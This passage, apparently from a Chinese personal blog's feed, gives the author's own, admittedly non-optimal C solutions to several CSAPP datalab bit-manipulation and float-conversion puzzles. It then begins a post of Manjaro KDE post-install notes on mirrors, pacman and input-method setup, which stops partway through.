c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把最高位1后的所有位全部填充为 1</span></span><br><span class="line">x = x | x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">x = x | x &gt;&gt; <span class="number">16</span>;</span><br></pre></td></tr></table></figure><p>接下来就是bitcount算法：</p><p>问题已转化为统计二进制中有多个1了。</p><p>先以4bit的数字为例：如何统计 <strong>0 1 0 1</strong>的1的个数？</p><p>我们可以通过掩码+移位的方式获取：</p><p>0 1 0 1 &amp; 1 = 1</p><p>(0 1 0 1 &gt;&gt; 1) &amp; 1 = 0</p><p>(0 1 0 1 &gt;&gt; 2) &amp; 1 = 1</p><p>(0 1 0 1 &gt;&gt; 3) &amp; 1 = 0</p><p>最后 1 + 0 + 1 + 0 = 2。</p><p>转化为代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">5</span>; <span class="comment">//(0 1 0 1)</span></span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br></pre></td></tr></table></figure><p>ok，上面是4bit的情况，如何计算32位呢。 我们当然可以写32次 += 操作来做。但是有更聪明的做法，运用分治的思想，将一个32bit的数，分成4个8bit的段。对每个段，运用上面的算法运算即可。</p><p>具体需要个人分析一下代码了，代码很短，所以也很好想清楚。</p><p>具体代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计算现在1的个数 分治算法 将整个二进制bit分成4段,每段8bit</span></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>;         <span class="comment">// 0001</span></span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>; <span class="comment">// 0000 0001 后文同理</span></span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">4</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">5</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">6</span>) &amp; mask;</span><br><span class="line">sum += (x &gt;&gt; <span class="number">7</span>) &amp; mask;</span><br><span class="line"></span><br><span class="line">sum =  (sum &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br></pre></td></tr></table></figure><p>ok,现在的sum就是 32bit的二进制中的1的个数了。</p><p>结合上面所有算法，可得最终的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 如果 x&lt; 0, 则翻转x</span></span><br><span class="line">    <span class="keyword">int</span> reverse_x = ~x;</span><br><span class="line">    <span class="comment">// 使用前面的conditional 来做</span></span><br><span class="line">    <span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">int</span> flag = !(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">    x = (~(flag + negative_one) &amp; x) | ((flag + negative_one) &amp; reverse_x);</span><br><span class="line">    <span class="comment">// 把最高位1后的所有位全部填充为 1</span></span><br><span class="line">    x = x | x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x = x | x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="comment">// 计算现在1的个数 分治算法 将整个二进制bit分成8段,每段4bit</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">1</span>;         <span class="comment">// 0001</span></span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>; <span class="comment">// 0000 0001 后文同理</span></span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    mask = mask &lt;&lt; <span class="number">8</span> | <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    sum += x &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">1</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">2</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">3</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">4</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">5</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">6</span>) &amp; mask;</span><br><span class="line">    sum += (x &gt;&gt; <span class="number">7</span>) &amp; mask;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分段计算0的个数</span></span><br><span class="line">    <span class="keyword">return</span> (sum &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) + ((sum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>) + <span class="number">1</span>; <span class="comment">// 符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-float-twice"><a href="#11-float-twice" class="headerlink" title="11. float_twice"></a>11. float_twice</h2><p>题目：</p><ul><li>目标： 给定一个浮点数f，返回2*f的二进制表示（单精度float point）。如果为Nan，直接返回参数。</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>其实能用if loop后，问题都变得比较简单。只用按照float的IEEE定义与实现取做就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取exp</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">exp</span> = (uf &amp; <span class="number">0x7fffffff</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Nan</span></span><br><span class="line">    <span class="keyword">unsigned</span> Nan = <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == Nan) &#123;</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exp == 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 除符号位外,left shift即可</span></span><br><span class="line">        <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">        uf = uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        uf = sign ? (uf | <span class="number">0x80000000</span>) : (uf &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// here , exp != 0</span></span><br><span class="line">    <span class="comment">// exp + 1即可</span></span><br><span class="line">    <span class="built_in">exp</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) &#123;</span><br><span class="line">        <span class="comment">// 变为无穷大</span></span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | <span class="number">0x7f800000</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x807fffff</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-float-i2f"><a href="#12-float-i2f" class="headerlink" title="12. float_i2f"></a>12. float_i2f</h2><p>题目：</p><ul><li>目标： 给定一个int类型的x，返回(float)x的二进制表示。</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>本题依然不算难，唯一需要注意的是，int转为float是有精度损失的。因为int是32bit，但是float的小数m只有23bit，在转化时，需要做舍入操作，舍入采用的是就近偶数（ nearest even）原则。</p><p><strong>我的解法超过了max ops了，并不是最优解</strong></p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 0是特殊情况,本应该采用denormalized方式表达接近0的数,但是这里只有0这个数需要采用denormalized</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// tmin 特殊 因为 -tmin = tmin ,二进制情况</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0x80000000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xcf000000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 记录符号位</span></span><br><span class="line">    <span class="keyword">int</span> sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">1</span>)</span><br><span class="line">        x = -x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> bias = <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 找到最高有效位</span></span><br><span class="line">    <span class="keyword">int</span> highest_one_offset = <span class="number">30</span>;                 <span class="comment">// 略过符号位</span></span><br><span class="line">    <span class="keyword">while</span> (((x &gt;&gt; highest_one_offset) &amp; <span class="number">1</span>) != <span class="number">1</span>) <span class="comment">// 因为x!=0, 所有在遍历过程中一定会遇到1</span></span><br><span class="line">        highest_one_offset--;</span><br><span class="line">    <span class="built_in">exp</span> = bias + highest_one_offset;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  构造截断mask,截出所有小数位</span></span><br><span class="line">    <span class="keyword">int</span> trunc_frac_mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; highest_one_offset - <span class="number">1</span>; i++)</span><br><span class="line">        trunc_frac_mask = (trunc_frac_mask &lt;&lt; <span class="number">1</span>) | <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 最低有效位1的便宜量</span></span><br><span class="line">    <span class="keyword">int</span> lowest_one_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (((x &gt;&gt; lowest_one_offset) &amp; <span class="number">1</span>) != <span class="number">1</span>) <span class="comment">// 去掉所有末尾的0</span></span><br><span class="line">        lowest_one_offset++;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果截断长度大于了23位,考虑舍入问题</span></span><br><span class="line">    <span class="keyword">int</span> frac_len = highest_one_offset - lowest_one_offset;</span><br><span class="line">    <span class="keyword">if</span> (frac_len &lt;= <span class="number">23</span>) &#123;</span><br><span class="line">        <span class="comment">// 不用舍入</span></span><br><span class="line">        m = (x &amp; trunc_frac_mask) &gt;&gt; lowest_one_offset;</span><br><span class="line">        <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span> | m &lt;&lt; (<span class="number">23</span> - highest_one_offset + lowest_one_offset);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 需要舍入,(nearest even)</span></span><br><span class="line">        <span class="keyword">int</span> temp_frac = (x &amp; trunc_frac_mask) &gt;&gt; lowest_one_offset;</span><br><span class="line">        <span class="comment">// 检验有效位后的第一位</span></span><br><span class="line">        <span class="keyword">if</span> ((temp_frac &gt;&gt; (frac_len - <span class="number">23</span> - <span class="number">1</span>) &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 情况1:如果为0,说明将要舍入的部分 未达到小数范围一半直接舍入即可</span></span><br><span class="line">            m = temp_frac &gt;&gt; (frac_len - <span class="number">23</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 情况2:如果为1, 检验是否后面的舍入位是否为全0</span></span><br><span class="line">            <span class="keyword">int</span> offset_r = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((offset_r &lt; (frac_len - <span class="number">23</span> - <span class="number">1</span>)) &amp;&amp; (temp_frac &gt;&gt; (offset_r) &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">                offset_r++;</span><br><span class="line">            <span class="keyword">if</span> (offset_r &lt; frac_len - <span class="number">23</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果后面的舍入位不全为0,则直接向上舍入</span></span><br><span class="line">                m = (temp_frac &gt;&gt; (frac_len - <span class="number">23</span>)) + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//  如果后面的舍入位(包含leading位)刚好为一般,及 ?.1000000这种形式,需要考虑偶数舍入</span></span><br><span class="line">                <span class="keyword">if</span> ((temp_frac &gt;&gt; (frac_len - <span class="number">23</span>) &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//情况3, 向下舍</span></span><br><span class="line">                    m = temp_frac &gt;&gt; (frac_len - <span class="number">23</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 情况4,向上舍</span></span><br><span class="line">                    m = (temp_frac &gt;&gt; (frac_len - <span class="number">23</span>)) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-float-f2i"><a href="#13-float-f2i" class="headerlink" title="13. float_f2i"></a>13. float_f2i</h2><p>题目：</p><ul><li>目标： 给定一个float类型的x，返回(int)x的二进制表示。Anything out of range (including NaN and infinity) should return 0x80000000u.</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>同样，按照定义来即可。只是要注意tmin是特殊的，需要单独考虑。另外需要考虑如何判定out of range。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">float_f2i</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//tmin 是特殊</span></span><br><span class="line">    <span class="keyword">if</span> (uf == <span class="number">0xcf000000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取exp</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">exp</span> = (uf &amp; <span class="number">0x7fffffff</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    <span class="comment">// 两个特殊情况, exp 全0或全1</span></span><br><span class="line">    <span class="comment">// if exp is 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if ex = nan or inf</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sign位</span></span><br><span class="line">    <span class="keyword">int</span> sign = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// e就是小数位数</span></span><br><span class="line">    <span class="keyword">int</span> e = <span class="built_in">exp</span> - <span class="number">127</span>; <span class="comment">// bias = 127</span></span><br><span class="line">    <span class="comment">// m小数位</span></span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="comment">// 保留结果</span></span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="comment">// 指数 &lt; 0</span></span><br><span class="line">    <span class="keyword">if</span> (e &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> sign ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 指数 &gt; 0</span></span><br><span class="line">        <span class="comment">// 找到小数位的第一个1</span></span><br><span class="line">        <span class="keyword">int</span> frac_leading_one_offset = <span class="number">22</span>;</span><br><span class="line">        <span class="keyword">while</span> (frac_leading_one_offset &gt; <span class="number">0</span> &amp;&amp; ((uf &gt;&gt; frac_leading_one_offset) &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            frac_leading_one_offset++;</span><br><span class="line">        <span class="keyword">if</span> (frac_leading_one_offset == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// m为全0</span></span><br><span class="line">            result = <span class="number">1</span> &lt;&lt; e;</span><br><span class="line">            <span class="keyword">return</span> sign ? -result : result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// m 不为全0 需要是否考虑out of range</span></span><br><span class="line">           <span class="keyword">if</span>(frac_leading_one_offset + e &gt;= <span class="number">31</span>) <span class="comment">// 条件检测</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="comment">// out of range</span></span><br><span class="line">               <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="comment">// 没有 out of range</span></span><br><span class="line">               m = uf &amp; <span class="number">0x7fffff</span>;</span><br><span class="line">               <span class="keyword">int</span> result = (<span class="number">1</span> &lt;&lt; (e + <span class="number">1</span>)) + (m &gt;&gt; (<span class="number">23</span> - e));</span><br><span class="line">               <span class="keyword">return</span> sign ? -result : result;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;准备把csapp详细看一遍，所有lab都做一遍，加深理解。&lt;/p&gt;
&lt;p&gt;本篇是datalab的个人解法，&lt;strong&gt;所以很可能不是最优解&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;原课程地址：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5jcy5jbXUuZWR1L2Fmcy9jcy9hY2FkZW1pYy9jbGFzcy8xNTIxMy1mMTUvd3d3L3NjaGVkdWxlLmh0bWw=&quot; title=&quot;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html&quot;&gt;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ok，现在就来一道道题说明。&lt;/p&gt;
&lt;h2 id=&quot;0-说明&quot;&gt;&lt;a href=&quot;#0-说明&quot; class=&quot;headerlink&quot; title=&quot;0. 说明&quot;&gt;&lt;/a&gt;0. 说明&lt;/h2&gt;&lt;p&gt;datalab着重于让学生理解 数字（integer，float point)在bit level上的表示与操作。通过限制学生的操作集（如仅能使用 ~, |, +等此操作），让学生在bit level上思考问题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="Datalab" scheme="https://www.ravenxrz.ink/tags/Datalab/"/>
    
  </entry>
  
  <entry>
    <title>manjaro-kde安装后续事项记录</title>
    <link href="https://www.ravenxrz.ink/archives/c8147f45.html"/>
    <id>https://www.ravenxrz.ink/archives/c8147f45.html</id>
    <published>2020-06-08T02:55:23.000Z</published>
    <updated>2020-09-06T07:37:36.766Z</updated>
    
    <content type="html"><![CDATA[<p>本博文主要写给自己做记录，其它朋友也作为参考。</p><h2 id="1-更新源"><a href="#1-更新源" class="headerlink" title="1. 更新源"></a>1. 更新源</h2><p>安装任何linux发行版后（除非是国内开发的发行版，如deepin），第一步做的就是切换到国内源，manjaro也不例外:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank </span><br></pre></td></tr></table></figure><p>添加archlinux源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">suo &#x2F;etc&#x2F;pacman.conf</span><br><span class="line">## 中国科学技术大学 (ipv4, ipv6, http, https)</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinuxcn&#x2F;$arch</span><br></pre></td></tr></table></figure><p>更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-添加必要软件"><a href="#2-添加必要软件" class="headerlink" title="2. 添加必要软件"></a>2. 添加必要软件</h2><ol><li>vim, google-chrome, rime输入法</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S vim google-chrome fcitx-rime</span><br></pre></td></tr></table></figure><p>输入法需要配置一下，在~/.xprofile中添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># fcitx</span><br><span class="line">export GTK_IM_MODULE&#x3D;fcitx</span><br><span class="line">export XMODIFIERS&#x3D;@im&#x3D;fcitx</span><br><span class="line">export 